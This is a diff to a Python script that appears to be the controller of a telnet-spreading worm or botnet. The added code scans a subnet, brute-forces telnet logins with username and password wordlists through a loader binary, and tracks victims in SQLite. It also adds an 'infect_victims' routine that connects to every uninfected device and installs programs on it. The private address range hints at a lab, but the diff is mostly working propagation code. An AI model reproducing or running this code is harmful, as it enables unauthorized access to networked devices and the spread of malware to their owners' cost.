@@ -8,6 +8,7 @@ import os;
 import telnetlib3;
 import subprocess;
 import socket;
+import time
 import sqlite3
 
 path = os.path.dirname(inspect.stack()[0][1])
@@ -26,7 +27,10 @@ def get_con():
 
 def main():
     print(f"self_ip: {self_ip}")
+    scan(True, "172.18.0.0", "28")
     brute_next_device()
+    time.sleep(1) # ugly but works
+    asyncio.run(infect_victims())
 
 
 # this and the below function install programs have the purpose of
@@ -69,29 +73,66 @@ def get_device_data_from_db(ip):
 
     return rows
 
-# picks first device from db row and brutes it, removes from tobrute and adds to device
+def scan(from_root, iprange, ipmask):
+    if from_root:
+        rc = subprocess.run([f"{default_bin_path}/scanner_amd64", iprange, ipmask])
+        return rc
+    else:
+        # SELECT RANDO TO DO IT
+        pass
+
+def update_bruted_status():
+    con = get_con()
+    con.execute("""
+        UPDATE devices_tobrute
+        SET bruted = 1
+        WHERE device_id IN (
+            SELECT device_id
+            FROM instructions
+            WHERE instruction LIKE 'load%'
+              AND status = 1
+        )
+    """)
+    con.commit()
+    con.close()
+
+# picks first device from db row and brutes it, marks as bruted and adds to devices
 def brute_next_device():
+    update_bruted_status()
     con = get_con()
     rows = con.execute(
         """
         SELECT device_id, ip, scanned_by_ip
         FROM devices_tobrute
+        WHERE bruted = 0
     """).fetchone()
 
     device_id, ip, scanned_by_ip = rows
     if (scanned_by_ip == self_ip):
         # spawn loader in this device
-        subprocess.run([f"{default_bin_path}/loader_amd64", ip, "23", f"{default_wordlist_path}/testuser.txt", f"{default_wordlist_path}/testpass.txt", "20"])
-        pass
+        rc = subprocess.run([f"{default_bin_path}/loader_amd64", ip, "23", f"{default_wordlist_path}/testuser.txt", f"{default_wordlist_path}/testpass.txt", "20"])
+        print(f"rc: {rc}\n")
+        if rc.returncode == 0:
+            print(f"updating table tobrute device id {device_id}\n")
+            con.execute("""
+                UPDATE devices_tobrute
+                SET bruted = 1
+                WHERE device_id = (?)
+            """, [device_id])
+            con.commit()
     else:
         instruction = f"load {ip}"
+        # does not insert instruction while device still has an ongoing one
         con.execute("""
-            UPDATE devices
-            SET instruction = (?)
-            WHERE ip = (?)
-        """, [instruction, scanned_by_ip])
-        #TODO: delete after done
-
+            INSERT INTO instructions (device_id, instruction, status)
+            VALUES (?, ?, ?)
+            ON CONFLICT(device_id)
+            DO UPDATE SET
+                instruction = excluded.instruction,
+                status = excluded.status
+            WHERE excluded.status = 1
+        """, [device_id, instruction, 0])
+        con.commit()
     con.close()
 
 async def install_programs(ip):
@@ -99,8 +140,23 @@ async def install_programs(ip):
     reader, writer = await telnetlib3.client.open_connection(ip, 23);
     await shell(reader, writer, data[0], data[1], data[2]);
 
+async def infect_victims():
+    con = get_con()
+    ips = con.execute("""
+        SELECT ip
+        FROM devices
+        WHERE infected = 0
+        """).fetchall()
+
+    con.close()
+    print(f"IPs to infect {ips}")
+    for (ip,) in ips:
+        print(f"Infecting {ip}")
+    tasks = [install_programs(ip) for (ip,) in ips]
+    await asyncio.gather(*tasks)
+
 if __name__ == "__main__":
     if len(sys.argv) > 1:
-        asyncio.run(install_programs(sys.argv[1]))
+        asyncio.run(infect_victims())
     else:
         main()
